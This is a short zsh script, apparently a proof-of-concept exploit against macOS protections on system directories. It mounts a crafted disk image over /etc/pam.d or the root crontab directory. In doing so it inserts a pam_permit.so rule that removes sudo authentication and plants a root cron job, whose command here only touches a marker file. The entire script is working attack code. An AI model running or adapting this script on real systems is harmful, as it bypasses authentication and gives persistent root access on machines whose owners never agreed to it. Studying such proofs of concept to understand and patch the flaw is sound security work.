#!/bin/zsh
#set -x

#Make sure arguments are supplied
if [ $# -eq 0 ]
  then
    echo "Error: No arguments supplied\n\t0 - mount over crontabs\n\t1 - mount over pam.d\n"
    exit 1
fi

if [ $1 -ne 0 -a $1 -ne 1 ]
  then
    echo "Error: argument must be 0 or 1\n\t0 - mount over crontabs\n\t1 - mount over pam.d\n"
    exit 1
fi

# Make sure only root can run our script
if [ "$(id -u)" != "0" ]; then
   echo "Error: This script must be run as root"
   exit 1
fi

#cleanup
rm /tmp/tmp.dmg

#create a disk image
hdiutil create /tmp/tmp.dmg -size 2m -ov -volname "bypass" -fs APFS
hdiutil attach /tmp/tmp.dmg 

#copy pam config files to our disk image
cp /etc/pam.d/* /Volumes/bypass 

#add write permission to the files we want to edit
chmod +w /Volumes/bypass/sshd 
chmod +w /Volumes/bypass/sudo 

#add rule to sudo
echo -e "auth       sufficient     pam_permit.so\n$(cat /Volumes/bypass/sudo)" > /Volumes/bypass/sudo

#add crontab file to disk image
CMD="touch /private/tmp/crontab_tcc_bypassed.txt"
echo "* * * * *" "$CMD" > /Volumes/bypass/root
sudo chown root:wheel /Volumes/bypass/root
sudo chown 700 /Volumes/bypass/root

#unmount
hdiutil detach /Volumes/bypass


if [ $1 -eq 1 ]
  then
    #mount over pam.d
    hdiutil attach -mountpoint /etc/pam.d -owners on /tmp/tmp.dmg
fi

if [ $1 -eq 0 ]
  then
	#or mount over crontabs
	hdiutil attach -mountpoint /private/var/at/tabs -owners on /tmp/tmp.dmg
	
	#change ownership from _unknown:_unknown to root:wheel
	chflags -R nouappnd /private/var/at/tabs
	chflags -R nouappnd /private/var/at/tabs/*
	chown root:wheel /private/var/at/tabs/*
fi